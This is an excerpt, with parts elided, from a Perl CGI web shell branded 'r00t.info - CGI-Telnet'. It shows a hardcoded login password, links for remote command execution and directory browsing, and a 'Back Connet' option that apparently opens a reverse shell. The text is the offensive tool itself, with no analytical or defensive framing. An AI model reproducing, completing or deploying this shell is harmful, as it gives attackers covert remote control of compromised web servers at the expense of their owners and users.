...
$EditPersion="<font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;'>r00t.info - CGI-Telnet</font>";

$Password = "r00tlababa";			# Change this. You will need to enter this
				# to login.
sub Is_Win(){
...
<a href="$ScriptLocation?a=command&d=$EncodedCurrentDir">Komut</a> |
<a href="$ScriptLocation?a=gui&d=$EncodedCurrentDir">Dizin</a> | 
...
<a href="$ScriptLocation?a=backbind">Back Connet</a> |
...
<font style="font: 15pt Verdana; color: yellow;">Copyright (C) 2001 r00t.info </font><br><br>
